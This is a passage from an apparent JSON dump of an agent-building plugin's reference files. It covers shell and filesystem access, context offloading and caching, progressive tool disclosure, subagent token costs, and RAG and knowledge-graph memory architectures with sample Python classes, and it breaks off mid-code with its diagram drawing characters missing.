        "plugins/sys-agents/skills/architecting-agents/references/computer-access.md": "# Computer Access Pattern\n\nAgents benefit from access to a computer, giving them primitives like a filesystem and shell.\n\n## Core Insight\n\n> The fundamental coding agent abstraction is the CLI, rooted in the fact that agents need access to the OS layer. It's more accurate to think of Claude Code as \"AI for your operating system\".\n\n## Components\n\n### Filesystem\n\nProvides agents with:\n- **Persistent context**: State survives across tool calls\n- **External memory**: Store information outside context window\n- **Coordination**: Share state between sub-agents\n- **Artifacts**: Produce tangible outputs\n\n### Shell\n\nEnables agents to:\n- Run built-in utilities (ls, grep, find)\n- Execute CLIs (git, npm, docker)\n- Run provided scripts\n- Execute code they write\n\n## Production Examples\n\n| Agent | Computer Access |\n|:------|:----------------|\n| Claude Code | \"Lives on your computer\" |\n| Manus | Virtual computer environment |\n| Cursor | Direct filesystem + shell |\n| Devin | Sandboxed computer environment |\n\n## Implementation Pattern\n\n```\n\n           Agent                     \n\n               \n    \n                         \n         \n Bash              File    \n Tool              Tools   \n         \n                        \n                        \n\n           Operating System          \n  - Shell utilities                  \n  - CLIs (git, npm, docker)          \n  - Filesystem                       \n  - Network (curl, etc.)             \n\n```\n\n## Best Practices\n\n### Filesystem Usage\n\n| Pattern | Use |\n|:--------|:----|\n| Scratchpads | Temporary thinking space |\n| Plan files | Long-running task coordination |\n| Output files | Artifact storage |\n| Log files | Session history |\n\n### Shell Usage\n\n| Pattern | Use |\n|:--------|:----|\n| Utilities | Quick system queries |\n| CLIs | Specialized operations (git, docker) |\n| Scripts | Complex multi-step operations |\n| Generated code | Dynamic execution |\n\n## Security Considerations\n\n- Sandbox when possible (containers, VMs)\n- Limit network access if not needed\n- Audit file system writes\n- Prefer read-only operations for exploration\n",
        "plugins/sys-agents/skills/architecting-agents/references/context-patterns.md": "# Context Management Patterns\n\nDetailed implementation patterns for context offloading, caching, isolation, and evolution.\n\n## Context Offloading\n\n### The Problem\nContext compaction (summarization) can result in loss of useful information. Full fidelity is often needed for complex tasks.\n\n### Solution: Filesystem Offloading\n\n**Manus Approach:**\n1. Write old tool results to files\n2. Apply summarization only when diminishing returns from offloading\n3. Agent can read files back if needed\n\n**Cursor Approach:**\n1. Offload tool results to filesystem\n2. Offload agent trajectories\n3. Read back into context on demand\n\n### Plan File Pattern\n\nFor long-running agents, use plan files to maintain objective alignment:\n\n```\n1. Write plan to file at task start\n2. Read plan periodically to reinforce objectives\n3. Verify work against plan\n4. Update plan as requirements evolve\n```\n\n---\n\n## Context Caching\n\n### Why Caching Matters\n\nAgents become cost-prohibitive without prompt caching:\n- Cached tokens: ~10x cheaper than uncached\n- Cache hit rate: Most important production metric\n- Higher-capacity model with caching can be cheaper than lower-cost model without\n\n### Requirements for Cache Hits\n\n| Requirement | Explanation |\n|:------------|:------------|\n| Stable prefix | System prompt must not change |\n| Append-only | Never modify previous messages |\n| Deterministic | Same data = same tokens (sort JSON keys) |\n| Explicit breaks | Mark cache boundaries when possible |\n\n### Anti-Patterns\n\n- Mutating session history mid-conversation\n- Changing system prompts dynamically\n- Non-deterministic serialization of structured data\n\n---\n\n## Context Isolation\n\n### The Ralph Wiggum Pattern\n\nNamed pattern for running agents repeatedly until a plan is satisfied:\n\n```\n\n  Initializer Agent                  \n  - Sets up plan file                \n  - Creates tracking file            \n  - Establishes environment          \n\n                  \n    \n                               \n               \n Sub-                    Sub-    \n Agent 1                 Agent N \n               \n                              \n     \n                \n        \n         Git History   \n         (Progress)    \n        \n                \n                \n        \n         Stop Hook     \n         (Verification)\n        \n```\n\n### Use Cases for Isolation\n\n| Scenario | Why Isolation Helps |\n|:---------|:--------------------|\n| Parallel reviews | Each reviewer has focused context |\n| Migrations | Each file gets isolated context |\n| Long tasks | Context doesn't saturate |\n| Different expertise | Specialized prompts per sub-agent |\n\n---\n\n## Context Evolution\n\n### Continual Learning in Token Space\n\nUpdate agent context (not model weights) with learnings over time.\n\n### Task-Specific Prompt Evolution (GEPA Pattern)\n\n```\n1. Collect agent trajectories\n2. Score trajectory outcomes\n3. Reflect on failures\n4. Propose mix of task-specific prompt variants\n5. Test variants\n6. Select best performers\n```\n\n### Memory Evolution\n\n```\n1. Distill sessions into diary entries\n2. Reflect across diary entries\n3. Update CLAUDE.md or equivalent\n4. Loop over time\n```\n\n### Skill Evolution\n\n```\n1. Reflect over trajectories\n2. Identify reusable procedures\n3. Save as new skills to filesystem\n4. Skills available for future sessions\n```\n\n### Sleep-Time Compute\n\nAgents can think offline about their own context:\n- Reflect over past sessions\n- Update memories or skills proactively\n- Prepare for anticipated future tasks\n",
        "plugins/sys-agents/skills/architecting-agents/references/progressive-disclosure.md": "# Progressive Disclosure for Agents\n\nDesign pattern that shows only essential information upfront and reveals more details only as needed.\n\n## The Problem\n\nTool definitions overload context windows:\n- GitHub MCP server: 35 tools, ~26K tokens\n- More tools can confuse models (overlapping functionality)\n- All loaded upfront = constant context overhead\n\n## Disclosure Strategies by Layer\n\n### Tool Calling Layer\n\n**Index and Retrieve:**\n1. Maintain lightweight index of tool capabilities\n2. Use a search/retrieve tool to find relevant tools\n3. Load full definition only when needed\n\n**Example:**\n```\nAvailable: [file_ops, git_ops, search, ...] (short descriptions)\nAgent decides: \"I need git_ops\"\nLoad: Full git_ops tool definition\n```\n\n### Shell Utilities Layer\n\n**Manus Pattern:**\n1. Provide list of available utilities in agent instructions\n2. Agent uses bash to call `--help` to learn specifics\n3. Full documentation loaded just-in-time\n\n**Example:**\n```\nInstructions: \"Available utilities: jq, ripgrep, fd, git, ...\"\nAgent needs jq: runs `jq --help`\nAgent now has full jq knowledge\n```\n\n### MCP Servers Layer\n\n**Cursor Pattern:**\n1. Sync MCP tool descriptions to a folder\n2. Give agent short list of available tools\n3. Agent reads full description only when task matches\n\n**Anthropic/Cloudflare Pattern:**\nSimilar indexed/on-demand loading for MCP management.\n\n### Skills Layer\n\n**Anthropic Skills Standard:**\n1. Skills are folders containing SKILL.md files\n2. YAML frontmatter is loaded into agent instructions (low cost)\n3. Agent decides to read full SKILL.md only when needed (high cost)\n\n```yaml\n# Frontmatter (always loaded)\n---\nname: my-skill\ndescription: \"Does X. Use when Y.\"\n---\n\n# Full content (loaded on demand)\n[Detailed instructions, references, etc.]\n```\n\n## Implementation Checklist\n\n- [ ] Identify all action sources (tools, CLIs, MCPs, skills)\n- [ ] Create lightweight index/description for each\n- [ ] Design retrieval mechanism (explicit or pattern-based)\n- [ ] Load full definitions only when task requires\n- [ ] Track token savings from disclosure pattern\n\n## Token Impact\n\n| Approach | Cost |\n|:---------|:-----|\n| All tools loaded upfront | High (constant) |\n| Progressive disclosure | Low (variable, task-dependent) |\n| Typical savings | 50-80% reduction in baseline overhead |\n",
        "plugins/sys-agents/skills/architecting-agents/references/subagent-risks.md": "# Subagent Crisis & Risk Analysis\n\n**January 2026**\n\n## The Core Problem\n\nSubagents are almost always a mistake within standard plan constraints due to their high token cost and quota consumption.\n\n## The 5-Hour Rule\n\n- A Pro session provides ~200k tokens (5 hours of typical usage)\n- Subagent spawn costs: 20K-25K tokens to \"say hello\"\n- Full system prompt reinstantiated (not cached)\n- CLAUDE.md re-read in each subagent\n- MCP/project context duplicated\n\n**Real-World Impact:** Task to refactor >1000 LOC script created >40 parallel agents, each re-reading entire script. Result: Session exhaustion in 30-90 minutes instead of 5 hours.\n\n## Quota Impact (Z.AI/Subscription Models)\n\n- Subagents consume **1 prompt quota** per spawn (not a free tool call)\n- A prompt allows 15-20 tool calls for free\n- Spawning 10 subagents = 10 prompts consumed = 150-200 potential tool calls wasted\n- **Use `context: fork` instead:** Runs as isolated skill context, counts as tool call (free within prompt), not as new prompt\n\n## Examples\n\n**BAD (Subagent for simple task):**\n```yaml\n# Wastes 25k tokens + 1 prompt quota\nTask(subagent_type=\"general-purpose\", prompt=\"Extract data from this CSV\")\n```\n\n**GOOD (Inline skill):**\n```yaml\n# Costs ~1x, free within prompt\n# Just do the work directly in context\nRead the CSV and extract the required data.\n```\n\n**GOOD (Fork for isolation when needed):**\n```yaml\n---\nname: processing-batch\ndescription: Processes multiple files in isolated context\ncontext: fork\n---\n# Costs 3x inline, but FREE as tool call within prompt\n# Avoids the 1 prompt quota penalty of subagents\n```\n\n## Official Recommendation\n\nUse main conversation when frequent back-and-forth needed. Use subagents ONLY when parallelization benefit clearly exceeds 20K token startup cost AND the subscription \"prompt cost\" overhead (subagents consume prompts, not free tool calls). Prefer `context: fork` for isolation needs.\n\n## Cost Comparison\n\n| Approach | Token Cost | Quota Cost | When to Use |\n|:---------|:-----------|:-----------|:------------|\n| **Inline** | ~1x | Free (tool call) | Most tasks |\n| **Fork** | ~3x | Free (tool call) | Isolation needed, heavy I/O |\n| **Subagent** | ~25k+ | 1 prompt per spawn | Parallelization only |\n",
        "plugins/sys-agents/skills/architecting-memory/SKILL.md": "---\nname: architecting-memory\ndescription: \"Implements progression from Vector RAG  GraphRAG  Temporal Knowledge Graphs. Use when designing persistent memory architectures for AI agent systems.\"\nuser-invocable: true\nallowed-tools: [Read, Write, Bash, Grep, Glob]\n---\n\n# Memory Systems for AI Agents\n\nImplements progression from Vector RAG  GraphRAG  Temporal Knowledge Graphs.\n\n## Architecture Selection\n\nStart here to choose the right approach.\n- **Decision Matrix**: [references/decision-matrix.md](references/decision-matrix.md)\n- **Detailed Design Patterns**: [references/patterns.md](references/patterns.md)\n\n## The Core Progression\n\n### Stage 1: Vector RAG (Semantic)\n### Stage 1: Vector RAG (Semantic)\n- **Guide**: [references/vector-rag.md](references/vector-rag.md)\n\n### Stage 2: GraphRAG (Relational)\n### Stage 2: GraphRAG (Relational)\n- **Guide**: [references/graph-rag.md](references/graph-rag.md)\n\n### Stage 3: Temporal KG (Time-Series)\n### Stage 3: Temporal KG (Time-Series)\n- **Guide**: [references/temporal-kg.md](references/temporal-kg.md)\n\n## Specialized Approaches\n\n### CrewAI Memory Model\n### CrewAI Memory Model\n- **Guide**: [references/crewai-approach.md](references/crewai-approach.md)\n\n### Technical Implementation\n- **Tech Stack Options**: [references/tech-stack.md](references/tech-stack.md)\n- **Common Architectures**: [references/architectures.md](references/architectures.md)\n",
        "plugins/sys-agents/skills/architecting-memory/references/architectures.md": "# Memory Architecture Patterns\n\nCommon memory architectures for AI agent systems.\n\n## Architecture 1: Simple Q&A System\n\n**Stack:** Vector RAG + LLM\n**Use Case:** Document Q&A, FAQ systems\n**Complexity:** Low\n\n### Components\n```\n\n   User Query    \n\n         \n         \n\n Vector Database \n  (ChromaDB)     \n\n         \n         \n\n    LLM          \n  (GPT-4)        \n\n         \n         \n\n   Response      \n\n```\n\n### Implementation\n```python\nclass SimpleQASystem:\n    def __init__(self, vector_db, embedding_model, llm):\n        self.vector_db = vector_db\n        self.embedding_model = embedding_model\n        self.llm = llm\n\n    def query(self, question: str) -> str:\n        # Embed question\n        query_embedding = self.embedding_model.embed(question)\n\n        # Search vector DB\n        results = self.vector_db.query(\n            query_embeddings=[query_embedding],\n            n_results=5\n        )\n\n        # Extract relevant context\n        context = \"\\n\".join(results[\"documents\"][0])\n\n        # Generate response\n        prompt = f\"\"\"\n        Question: {question}\n\n        Context:\n        {context}\n\n        Answer the question based on the context above.\n        \"\"\"\n\n        response = self.llm.generate(prompt)\n        return response\n```\n\n### Pros\n- GOOD Simple to implement\n- GOOD Fast semantic search\n- GOOD Good for FAQ-style questions\n- GOOD Minimal infrastructure\n\n### Cons\n- BAD No relationship modeling\n- BAD No temporal awareness\n- BAD Limited context window\n- BAD Cannot handle complex queries\n\n### When to Use\n- FAQ systems\n- Document search\n- Simple Q&A\n- Knowledge base lookup\n\n## Architecture 2: Entity-Centric System\n\n**Stack:** Vector RAG + Entity Extraction + Knowledge Graph\n**Use Case:** Research, analysis, relationship discovery\n**Complexity:** Medium\n\n### Components\n```\n\n   Documents     \n\n         \n         \n\n Entity Extract  \n      &          \n Relationship    \n    Mining       \n\n         \n    \n             \n \n Vector  Knowledge\n  DB      Graph  \n \n             \n    \n         \n\n    Hybrid       \n   Retrieval     \n\n         \n         \n\n    LLM          \n  (Context +     \n   Graph Data)   \n\n         \n         \n\n  Enriched       \n   Response      \n\n```\n\n### Implementation\n```python\nclass EntityCentricSystem:\n    def __init__(self, vector_db, knowledge_graph, entity_extractor, llm):\n        self.vector_db = vector_db\n        self.kg = knowledge_graph\n        self.entity_extractor = entity_extractor\n        self.llm = llm\n\n    def query(self, question: str) -> str:\n        # Extract entities from question\n        entities = self.entity_extractor.extract_entities(question)\n\n        # Get related entities from graph\n        related_entities = []\n        for entity in entities:\n            neighbors = self.kg.get_neighbors(entity[\"id\"])\n            related_entities.extend(neighbors)\n\n        # Search vector DB\n        query_embedding = self.entity_extractor.embed(question)\n        vector_results = self.vector_db.query(\n            query_embeddings=[query_embedding],\n            n_results=10\n        )\n\n        # Get graph context\n        graph_context = self._build_graph_context(related_entities)\n\n        # Combine contexts\n        context = self._combine_contexts(vector_results, graph_context)\n\n        # Generate response\n        prompt = f\"\"\"\n        Question: {question}\n\n        Context: {context}\n\n        Answer the question using both the retrieved documents and the graph context.\n        \"\"\"\n\n        response = self.llm.generate(prompt)\n        return response\n\n    def _build_graph_context(self, entities: List[str]) -> str:\n        \"\"\"Build context from knowledge graph\"\"\"\n        context_parts = []\n\n        for entity_id in entities:\n            entity = self.kg.get_entity(entity_id)\n            relationships = self.kg.get_relationships(entity_id)\n\n            context_parts.append(f\"Entity: {entity['name']}\")\n            for rel in relationships:\n                context_parts.append(f\"  - {entity['name']} {rel['type']} {rel['target']}\")\n\n        return \"\\n\".join(context_parts)\n\n    def _combine_contexts(self, vector_results: dict, graph_context: str) -> str:\n        \"\"\"Combine vector and graph contexts\"\"\"\n        docs = \"\\n\".join(vector_results[\"documents\"][0])\n        return f\"Documents:\\n{docs}\\n\\nGraph Context:\\n{graph_context}\"\n```\n\n### Pros\n- GOOD Models relationships\n- GOOD Multi-hop reasoning\n- GOOD Preserves document structure\n- GOOD Better for complex queries\n\n### Cons\n- BAD More complex implementation\n- BAD Requires entity extraction\n- BAD Graph maintenance overhead\n- BAD Slower than simple Vector RAG\n\n### When to Use\n- Research and analysis\n- Relationship discovery\n- Complex Q&A\n- Entity-centric applications\n\n## Architecture 3: Temporal Analytics System\n\n**Stack:** Full Temporal Knowledge Graph + Vector RAG + Time-Series Analysis\n**Use Case:** Event tracking, predictive analytics, historical analysis\n**Complexity:** High\n\n### Components\n```\n\n Historical Data \n\n         \n         \n\n Temporal KG     \n  Construction    \n\n         \n    \n             \n \n Temporal  Vector \n Graph      DB    \n \n             \n    \n         \n\n Temporal Query  \n   Processor     \n\n         \n         \n\n Pattern Mining  \n & Prediction    \n\n         \n         \n\n    LLM          \n  (Time-aware    \n   reasoning)    \n\n         \n         \n\n  Predictions &  \n   Insights      \n\n```\n\n### Implementation\n```python\nclass TemporalAnalyticsSystem:\n    def __init__(self, temporal_kg, vector_db, pattern_miner, predictor, llm):\n        self.temporal_kg = temporal_kg\n        self.vector_db = vector_db\n        self.pattern_miner = pattern_miner\n        self.predictor = predictor\n        self.llm = llm\n\n    def analyze(self, query: str, time_range: Tuple[datetime, datetime]) -> dict:\n        # Parse temporal constraints\n        start_time, end_time = time_range\n\n        # Get temporal data\n        events = self.temporal_kg.get_events_between(start_time, end_time)\n        entities = self.temporal_kg.get_entities_active_at(start_time)\n\n        # Mine patterns\n        patterns = self.pattern_miner.find_patterns(events)\n\n        # Make predictions\n        predictions = self.predictor.predict_future_state(entities, end_time)\n\n        # Get relevant documents\n        query_embedding = self.embed_query(query)\n        docs = self.vector_db.query(\n            query_embeddings=[query_embedding],\n            n_results=5\n        )\n\n        # Build context\n        context = self._build_temporal_context(events, patterns, predictions, docs)\n\n        # Generate insights\n        prompt = f\"\"\"\n        Query: {query}\n\n        Temporal Data:\n        {context}\n\n        Analyze the temporal patterns and provide insights.\n        \"\"\"\n\n        insights = self.llm.generate(prompt)\n\n        return {\n            \"patterns\": patterns,\n            \"predictions\": predictions,\n            \"insights\": insights,\n            \"time_range\": time_range\n        }\n\n    def _build_temporal_context(self, events: List[dict], patterns: List[dict],\n                               predictions: List[dict], docs: List[str]) -> str:\n        \"\"\"Build comprehensive temporal context\"\"\"\n        context_parts = []\n\n        # Events\n        event_summary = f\"Events ({len(events)} total):\\n\"\n        for event in events[-10:]:  # Last 10 events\n            event_summary += f\"  - {event['timestamp']}: {event['type']}\\n\"\n        context_parts.append(event_summary)\n\n        # Patterns\n        if patterns:\n            pattern_summary = \"Patterns Found:\\n\"\n            for pattern in patterns[:5]:  # Top 5 patterns\n                pattern_summary += f\"  - {pattern['type']}: {pattern['description']}\\n\"\n            context_parts.append(pattern_summary)\n\n        # Predictions\n        if predictions:\n            pred_summary = \"Predictions:\\n\"\n            for pred in predictions[:5]:  # Top 5 predictions\n                pred_summary += f\"  - {pred['entity']}: {pred['prediction']} (confidence: {pred['confidence']})\\n\"\n            context_parts.append(pred_summary)\n\n        # Documents\n        if docs:\n            doc_summary = \"Relevant Documents:\\n\"\n            doc_summary += \"\\n\".join(docs[\"documents\"][0][:3])\n            context_parts.append(doc_summary)\n\n        return \"\\n\".join(context_parts)\n```\n\n### Pros\n- GOOD Temporal reasoning\n- GOOD Pattern detection\n- GOOD Predictive capabilities\n- GOOD Historical context\n\n### Cons\n- BAD Most complex implementation\n- BAD Requires temporal data\n- BAD Complex queries\n- BAD Higher storage costs\n\n### When to Use\n- Event tracking systems\n- Predictive analytics\n- Historical analysis\n- Time-series forecasting\n- Audit and compliance\n\n## Architecture 4: Hybrid Multi-Modal System\n\n**Stack:** Vector DB + Knowledge Graph + Temporal KG + Multi-Modal Embeddings\n**Use Case:** Complex applications requiring all capabilities\n**Complexity:** Very High\n\n### Components\n```\n\n Multi-Modal     \n   Data          \n (Text, Images,  \n  Audio, Video)  \n\n         \n    \n             \n \n Vector   Knowledge\n  DBs      Graph  \n(Multi   (Entity  \n Modal)   + Temp) \n \n             \n    \n         \n\n   Intelligent   \n   Router        \n\n         \n         \n\n Multi-Modal    \n  Fusion        \n\n         \n         \n\n    LLM          \n (Multi-Modal)   \n\n         \n         \n\n Rich, Context-  \n   Aware Output \n\n```\n\n### Implementation\n```python\nclass MultiModalMemorySystem:\n    def __init__(self):\n        self.text_vector_db = ChromaDB()\n        self.image_vector_db = ChromaDB()\n        self.knowledge_graph = KnowledgeGraph()\n        self.temporal_kg = TemporalKnowledgeGraph()\n        self.fusion_engine = FusionEngine()\n\n    def store(self, data: dict):\n        \"\"\"Store multi-modal data\"\"\"\n        if \"text\" in data:\n            self._store_text(data[\"text\"], data.get(\"metadata\", {}))\n\n        if \"image\" in data:\n            self._store_image(data[\"image\"], data.get(\"metadata\", {}))\n\n        if \"temporal\" in data:\n            self._store_temporal(data[\"temporal\"])\n\n        if \"entities\" in data:\n            self._store_entities(data[\"entities\"])\n\n    def query(self, query: dict) -> dict:\n        \"\"\"Query multi-modal memory\"\"\"\n        results = {}\n\n        # Route query to appropriate components\n        if query.get(\"type\") == \"text\":\n            results[\"text\"] = self._query_text(query[\"query\"])\n        elif query.get(\"type\") == \"image\":\n            results[\"image\"] = self._query_image(query[\"query\"])\n        elif query.get(\"type\") == \"temporal\":\n            results[\"temporal\"] = self._query_temporal(query[\"time_range\"])\n        elif query.get(\"type\") == \"entity\":\n            results[\"entity\"] = self._query_entity(query[\"entity_id\"])\n        else:\n            # Multi-modal query\n            results = {\n                \"text\": self._query_text(query[\"query\"]),\n                \"image\": self._query_image(query.get(\"image_query\")),\n                \"temporal\": self._query_temporal(query.get(\"time_range\")),\n                \"entity\": self._query_entity(query.get(\"entity_id\"))\n            }\n\n        # Fuse results\n        fused_result = self.fusion_engine.fuse(results)\n        return fused_result\n```\n\n## Architecture Comparison\n\n| Aspect | Simple Q&A | Entity-Centric | Temporal Analytics | Multi-Modal |\n|--------|-----------|----------------|-------------------|-------------|\n| **Complexity** | Low | Medium | High | Very High |\n| **Implementation Time** | 1-2 weeks | 4-6 weeks | 8-12 weeks | 16-20 weeks |\n| **Infrastructure** | Minimal | Moderate | High | Very High |\n| **Maintenance** | Easy | Moderate | Complex | Very Complex |\n| **Scalability** | Good | Good | Medium | Medium |\n| **Use Cases** | FAQ, Search | Research, Analysis | Analytics, Prediction | Complex Apps |\n| **Best For** | Simple Q&A | Relationship Discovery | Time-Series | Rich Applications |\n\n## Selection Decision Tree\n\n```\nIs temporal reasoning important?\n YES  Is time the primary dimension?\n    YES  Temporal Analytics System\n    NO  Hybrid Multi-Modal System\n NO  Are relationships important?\n     YES  Is entity tracking needed?\n        YES  Hybrid Multi-Modal System\n        NO  Entity-Centric System\n     NO  Simple Q&A System\n```\n\n## Migration Path\n\n```\nSimple Q&A  Entity-Centric  Temporal Analytics  Multi-Modal\n   (1 month)         (3 months)          (6 months)              (12 months)\n```\n\n### Migration Strategy\n1. **Start Simple** - Begin with Vector RAG\n2. **Add Relationships** - Implement GraphRAG\n3. **Add Temporal** - Integrate Temporal KG\n4. **Go Multi-Modal** - Support multiple data types\n\n## Technology Stack Recommendations\n\n### Simple Q&A\n- **Vector DB:** ChromaDB or Pinecone\n- **Embeddings:** OpenAI or Cohere\n- **LLM:** GPT-4 or Claude\n\n### Entity-Centric\n- **Vector DB:** ChromaDB\n- **Graph DB:** Neo4j or NetworkX\n- **NER:** spaCy or Hugging Face\n- **LLM:** GPT-4 or Claude\n\n### Temporal Analytics\n- **Temporal DB:** Custom + Neo4j\n- **Time-Series:** InfluxDB or TimescaleDB\n- **ML:** scikit-learn or Prophet\n- **LLM:** GPT-4 or Claude\n\n### Multi-Modal\n- **Vector DBs:** Multiple (one per modality)\n- **Fusion:** Custom or PyTorch\n- **Multi-Modal Models:** CLIP, DALL-E, GPT-4V\n- **Infrastructure:** Kubernetes + Multiple Services\n\n## Performance Considerations\n\n### Latency\n- Simple Q&A: < 100ms\n- Entity-Centric: 200-500ms\n- Temporal Analytics: 1-5 seconds\n- Multi-Modal: 2-10 seconds\n\n### Storage Requirements\n- Simple Q&A: 10GB - 100GB\n- Entity-Centric: 100GB - 1TB\n- Temporal Analytics: 1TB - 10TB\n- Multi-Modal: 10TB - 100TB+\n\n### Compute Requirements\n- Simple Q&A: 1-2 CPUs\n- Entity-Centric: 4-8 CPUs\n- Temporal Analytics: 16-32 CPUs\n- Multi-Modal: 32-64+ CPUs\n\n## Best Practices\n\n### Do's\nGOOD Start with simplest architecture that meets needs\nGOOD Plan migration path from simple to complex\nGOOD Validate retrieval quality at each stage\nGOOD Monitor performance and costs\nGOOD Use appropriate technology stack\nGOOD Design for scalability from the beginning\n\n### Don'ts\nBAD Don't over-engineer (start simple)\nBAD Don't skip evaluation\nBAD Don't ignore maintenance costs\nBAD Don't forget to monitor\nBAD Don't ignore user feedback\nBAD Don't skip testing at each stage\n",
        "plugins/sys-agents/skills/architecting-memory/references/crewai-approach.md": "# CrewAI Three-Tier Memory Approach\n\nImplementation of CrewAI's three-tier memory architecture for AI agents.\n\n## Overview\n\nCrewAI implements a three-tier memory system for agents:\n1. **Short-Term Memory** - Current conversation context\n2. **Long-Term Memory** - Persistent knowledge\n3. **Entity Memory** - Entity profiles and relationships\n\n## Tier 1: Short-Term Memory\n\n### Purpose\n- Current conversation context\n- Immediate task state\n- Recent interactions\n\n### Implementation\n```python\nclass ShortTermMemory:\n    def __init__(self, max_tokens: int = 4000):\n        self.max_tokens = max_tokens\n        self.conversation_buffer = []\n        self.task_state = {}\n\n    def add_interaction(self, user_input: str, agent_response: str):\n        \"\"\"Add interaction to short-term memory\"\"\"\n        self.conversation_buffer.append({\n            \"user\": user_input,\n            \"agent\": agent_response,\n            \"timestamp\": datetime.now()\n        })\n\n        # Trim if exceeds max tokens\n        self._trim_to_max_tokens()\n\n    def get_relevant_context(self, query: str, top_k: int = 5) -> List[str]:\n        \"\"\"Get relevant context from conversation\"\"\"\n        # Simple relevance scoring\n        scores = []\n        for interaction in self.conversation_buffer[-20:]:  # Last 20 interactions\n            score = self._calculate_relevance(query, interaction)\n            scores.append((score, interaction))\n\n        # Sort by relevance\n        scores.sort(key=lambda x: x[0], reverse=True)\n\n        return [interaction for _, interaction in scores[:top_k]]\n\n    def update_task_state(self, key: str, value: any):\n        \"\"\"Update current task state\"\"\"\n        self.task_state[key] = value\n\n    def get_task_state(self, key: str) -> any:\n        \"\"\"Get task state\"\"\"\n        return self.task_state.get(key)\n\n    def _trim_to_max_tokens(self):\n        \"\"\"Trim conversation buffer to fit max tokens\"\"\"\n        total_tokens = self._estimate_tokens(self.conversation_buffer)\n\n        while total_tokens > self.max_tokens and len(self.conversation_buffer) > 1:\n            self.conversation_buffer.pop(0)\n            total_tokens = self._estimate_tokens(self.conversation_buffer)\n\n    def _calculate_relevance(self, query: str, interaction: dict) -> float:\n        \"\"\"Calculate relevance score (simplified)\"\"\"\n        # In practice, use embedding similarity\n        return len(set(query.split()) & set(interaction[\"user\"].split()))\n\n    def _estimate_tokens(self, buffer: List[dict]) -> int:\n        \"\"\"Estimate token count (simplified)\"\"\"\n        total_text = \"\"\n        for interaction in buffer:\n            total_text += interaction[\"user\"] + \" \" + interaction[\"agent\"] + \" \"\n        return len(total_text.split())\n```\n\n### Context Management\n```python\nclass ContextManager:\n    def __init__(self, short_term: ShortTermMemory, max_context_tokens: int = 8000):\n        self.short_term = short_term\n        self.max_context_tokens = max_context_tokens\n\n    def build_context(self, query: str) -> str:\n        \"\"\"Build context for agent\"\"\"\n        context_parts = []\n\n        # Add task state\n        task_context = self._build_task_context()\n        if task_context:\n            context_parts.append(task_context)\n\n        # Add relevant conversation\n        relevant = self.short_term.get_relevant_context(query, top_k=5)\n        conversation_context = self._build_conversation_context(relevant)\n        if conversation_context:\n            context_parts.append(conversation_context)\n\n        # Combine and trim\n        combined = \"\\n\".join(context_parts)\n        return self._trim_to_limit(combined)\n\n    def _build_task_context(self) -> str:\n        \"\"\"Build task context from short-term memory\"\"\"\n        if not self.short_term.task_state:\n            return \"\"\n\n        context = \"Current Task State:\\n\"\n        for key, value in self.short_term.task_state.items():\n            context += f\"- {key}: {value}\\n\"\n\n        return context\n\n    def _build_conversation_context(self, interactions: List[dict]) -> str:\n        \"\"\"Build conversation context\"\"\"\n        if not interactions:\n            return \"\"\n\n        context = \"Recent Conversation:\\n\"\n        for interaction in interactions[-3:]:  # Last 3 relevant\n            context += f\"User: {interaction['user']}\\n\"\n            context += f\"Agent: {interaction['agent']}\\n\"\n\n        return context\n\n    def _trim_to_limit(self, text: str, max_chars: int = None) -> str:\n        \"\"\"Trim text to fit in context window\"\"\"\n        if not max_chars:\n            max_chars = self.max_context_tokens * 4  # Approximate chars per token\n\n        if len(text) <= max_chars:\n            return text\n\n        return text[:max_chars] + \"...\"\n```\n\n## Tier 2: Long-Term Memory\n\n### Purpose\n- Persistent knowledge across sessions\n- Learn from past experiences\n- Accumulate domain knowledge\n\n### Implementation\n```python\nclass LongTermMemory:\n    def __init__(self, vector_db, embedding_func):\n        self.vector_db = vector_db\n        self.embedding_func = embedding_func\n        self.consolidation_threshold = 100  # Consolidate after 100 new memories\n\n    def store_memory(\n        self,\n        content: str,\n        metadata: dict,\n        memory_type: str = \"general\"\n    ):\n        \"\"\"Store memory in long-term storage\"\"\"\n        memory_id = f\"mem_{uuid.uuid4()}\"\n\n        # Embed memory\n        embedding = self.embedding_func.embed_query(content)\n\n        # Store in vector DB\n        self.vector_db.add(\n            ids=[memory_id],\n            documents=[content],\n            embeddings=[embedding],\n            metadatas=[\n                {\n                    **metadata,\n                    \"memory_type\": memory_type,\n                    \"timestamp\": datetime.now().isoformat()\n                }\n            ]\n        )\n\n        # Check if consolidation is needed\n        self._maybe_consolidate()\n\n    def retrieve_memories(\n        self,\n        query: str,\n        memory_types: List[str] = None,\n        top_k: int = 5\n    ) -> List[dict]:\n        \"\"\"Retrieve relevant memories\"\"\"\n        # Embed query\n        query_embedding = self.embedding_func.embed_query(query)\n\n        # Search vector DB\n        results = self.vector_db.query(\n            query_embeddings=[query_embedding],\n            n_results=top_k * 2  # Get more to filter\n        )\n\n        # Filter by memory type if specified\n        if memory_types:\n            filtered_results = []\n            for i, metadata in enumerate(results[\"metadatas\"][0]):\n                if metadata.get(\"memory_type\") in memory_types:\n                    filtered_results.append({\n                        \"content\": results[\"documents\"][0][i],\n                        \"metadata\": metadata,\n                        \"score\": results[\"distances\"][0][i]\n                    })\n            return filtered_results[:top_k]\n\n        return [\n            {\n                \"content\": results[\"documents\"][0][i],\n                \"metadata\": results[\"metadatas\"][0][i],\n                \"score\": results[\"distances\"][0][i]\n            }\n            for i in range(min(len(results[\"documents\"][0]), top_k))\n        ]\n\n    def _maybe_consolidate(self):\n        \"\"\"Periodically consolidate memories\"\"\"\n        # Check memory count\n        count = self.vector_db.count()\n\n        if count % self.consolidation_threshold == 0:\n            self._consolidate_memories()\n\n    def _consolidate_memories(self):\n        \"\"\"Consolidate similar memories\"\"\"\n        # Get all memories\n        all_memories = self.vector_db.get()\n\n        # Cluster similar memories\n        clusters = self._cluster_memories(all_memories)\n\n        # Create consolidated memories\n        for cluster in clusters:\n            consolidated = self._consolidate_cluster(cluster)\n            self._store_consolidated_memory(consolidated)\n\n    def _cluster_memories(self, memories: List[dict]) -> List[List[dict]]:\n        \"\"\"Cluster similar memories\"\"\"\n        # Simplified clustering - use DBSCAN or K-means in practice\n        return [memories]  # Return all as one cluster for simplicity\n\n    def _consolidate_cluster(self, cluster: List[dict]) -> dict:\n        \"\"\"Consolidate a cluster of memories\"\"\"\n        # Extract key information\n        content = \"\\n\".join([m[\"content\"] for m in cluster])\n        metadata = {\n            \"consolidated\": True,\n            \"source_memories\": [m[\"id\"] for m in cluster],\n            \"consolidation_timestamp\": datetime.now().isoformat()\n        }\n\n        return {\n            \"content\": content,\n            \"metadata\": 